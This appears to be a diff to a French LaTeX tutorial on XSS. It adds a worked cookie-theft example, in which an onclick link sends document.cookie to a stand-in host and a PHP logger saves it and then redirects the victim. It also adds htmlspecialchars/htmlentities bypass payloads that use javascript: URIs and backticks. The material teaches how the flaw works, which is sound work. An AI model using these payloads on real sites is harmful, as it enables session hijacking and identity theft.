@@ -338,7 +338,38 @@ Pour expliquer cela, il est beaucoup plus intéressant de prendre un exemple. Im
 
 \newpage
 \section{XSS}
-\subsection{XSS Test}
+\subsection{Que cela permet-il de faire ?}
+A cette question, je vais encore répondre par un exemple. Je considère que c'est par la pratique que l'on apprend les fondamentaux. Imaginons que nous soyons sur un forum et un lien a été posté. Bien entendu ce lien a été trafiqué par une XSS pour obtenir le code HTML suivant :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\begin{scriptsize}
+<a href="\#" onclick="document.location='http://www.xxx.com/hack/write.php?request='+document.cookie;">\\
+LIEN\\
+</a>
+\end{scriptsize}
+}}
+\vspace{0.2cm}
+
+Lorsque l'utilisateur cliquera dessus, ce lien le dirigera vers une page internet qui permet de récupérer le PHPSESSID par exemple qui est contenu dans un cookie. Avec cette information, il est alors possible d'usurper l'identité de l'utilisateur. Le script sur la page où arrivera l'utilisateur sera la suivante :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\begin{scriptsize}
+<?php\\
+\hspace*{0.6cm}\$myfile = fopen("log.txt", "w") or die("Unable to open file!");\\
+\hspace*{0.6cm}fwrite(\$myfile,\$\_GET['request']);\\
+\hspace*{0.6cm}fclose(\$myfile);\\
+?> \\
+<script>\\
+\hspace*{0.6cm}document.location="http://www.google.com";\\
+</script>
+\end{scriptsize}
+}}
+\vspace{0.2cm}
+
+Ce qui permet alors d'obtenir toutes les informations du cookie dans un fichier texte puis de rediriger l'utilisateur vers le moteur de recherche google. Puis on peux ensuite lire tranquillement le document texte et avec des outils comme Cookie Manager+, on peux alors trafiquer ces propres cookies pour imiter celui de l'utilisateur. Ceci est le concept de base de la faille XSS mais il est possible de pousser le vice pour faire de nombreuses autres choses bien plus dangereuse et intéressante.
+
+
+\subsection{Test de l'existence d'une faille XSS de manière rapide}
 Pour testé rapidement si une faille XSS est possible à un endroit ou non, on peux utiliser des chaines de test telles que les suivantes :
 \vspace{0.2cm}\\
 \fbox{\parbox{\textwidth}{
@@ -391,7 +422,7 @@ On obtient alors le résultat suivant qui nous montre qu'une faille XSS est poss
 \includegraphics[width=0.5\textwidth]{14}
 \vspace{0.2cm}
 }}
-\subsection{XSS Trick - Bypass htmlspecialchars in some cases}
+\subsection{XSS - Bypass htmlspecialchars par erreurs avec la balise SVG}
 Dans certains cas, la fonction htmlspecialchars est inutile comme on peux le voir ci-dessous :
 \vspace{0.2cm}\\
 \fbox{\parbox{\textwidth}{
@@ -487,14 +518,14 @@ Cette fois, il n'y a pas besoin d'effectuer un quelconque tamper sur les donnée
 \vspace{0.2cm}
 
 \vspace{0.2cm}
-\subsection{XSS Trick avec UTF-7 - Bypass htmlspecialchars et htmlentities}
+\subsection{XSS - Bypass htmlspecialchars et htmlentities avec UTF-7}
 
 \subsection{XSS - Bypass htmlspecialchars et htmlentities avec les directives Javascript}
 
 Comme dit plus haut, htmlspecialchars et htmlentities permettent seulement de convertir certains caractères et si l'on utilise aucun de ces caractères, ces deux fonctions deviennent inutiles. En utilisant les directives javascript, il est possible d'effectuer une XSS de la manière suivante :
 \vspace{0.2cm}\\
 \fbox{\parbox{\textwidth}{
-javascript:alert('XSS')
+javascript:alert(1)
 }}
 \vspace{0.2cm}
 
@@ -537,7 +568,39 @@ Et en utilisant la XSS, on bypass l'ensemble des fonctions :
 }}
 \vspace{0.2cm}
 
-\subsection{XSS - Bypass htmlspecialchars et htmlentities avec les guillemets graves}
+Il faut par conséquent utiliser la fonction strripos qui permet de filtrer l'ensemble des chaine utilisant le terme javascript.
+
+\subsection{XSS - Bypass htmlspecialchars et htmlentities avec les accents graves}
+
+Les deux fonctions htmlspecialchars et htmlentities ne filtre pas tous les caractères. Par exemple, l'accent grave est un caractère qui dans certains cas peux servir de variante aux guillemets. Si vous avez essayé, vous remarquerez que la XSS suivante ne fonctionne pas si les fonctions sont présentes :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+Javascript:alert('I am a XSS')\\
+ou encore\\
+Javascript:alert("I am a XSS")
+}}
+\vspace{0.2cm}
+
+Du coup, comment peux-t-on s'affranchir de ce filtrage de guillemets ? LES ACCENTS GRAVES ! Tout simplement comme ceci :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+Javascript:alert(`I am a XSS`)
+}}
+\vspace{0.2cm}
+
+Donc utilisons le script suivant :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{27}
+}}
+\vspace{0.2cm}
+
+Et en utilisant la XSS précédent, on peux cette fois utiliser des guillemets :
+\vspace{0.2cm}\\
+\fbox{\parbox{\textwidth}{
+\includegraphics[width=\textwidth]{28}
+}}
+\vspace{0.2cm}
 
 \newpage
 \section{Bibliographie}
